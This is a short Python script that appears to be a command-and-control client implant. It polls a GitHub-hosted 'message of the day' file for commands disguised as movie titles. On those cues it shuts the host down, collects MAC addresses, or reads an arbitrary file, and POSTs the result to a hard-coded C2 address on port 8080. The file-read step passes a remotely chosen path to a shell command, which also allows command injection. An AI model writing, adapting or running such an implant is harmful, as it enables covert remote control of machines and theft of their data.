import time, socket, requests
import subprocess, os

def system_call(cmd):

	return subprocess.check_output(cmd, shell=True)

def get_c2_cmd(URL):

	response = requests.get(URL)

	return response.text[:-1]

def split_cmd(cmd):

	cmd = cmd.split('\n')[-1]

	return cmd

def send_c2_data(C2, PORT, data):

	URL = "http://"+C2+":"+PORT+"/"

	testobj = {'data': data}

	response = requests.post(URL, json = testobj)

	return

def get_mac_addr():

	addrs = list()

	directory = "/sys/class/net/"

	for filename in os.listdir(directory):

		f = os.path.join(directory, filename)

		if os.path.exists(f):

			addr = system_call("cat /sys/class/net/"+filename+"/address")

			addrs.append(addr)

	return addrs

if __name__ =='__main__':

	C2 = "172.18.3.58"

	PORT = "8080"

	URL = "https://raw.githubusercontent.com/micahflack/scripts/main/msg_of_the_day"

	time.sleep(15)

	while True:

		# get cmd from updated c2
		cmd = get_c2_cmd(URL)

		# depending on returned msg, perform actions...

		if cmd:

			# shutdown
			if "Transformers: Dark Side of The Moon" in cmd:

				os.system("shutdown -P")

			# close client agent
			elif "The Wizard of Oz" in cmd:

				exit()

			# get mac addrs for all interfaces
			elif "Naruto Shippuden" in cmd:

				mac = get_mac_addr()

				send_c2_data(C2, PORT, mac)

			# grab specified file, send to C2
			elif "Christmas Past" in cmd:

				cmd = split_cmd(cmd)

				result = system_call("cat " + cmd)

				send_c2_data(C2, PORT, result)

		time.sleep(60)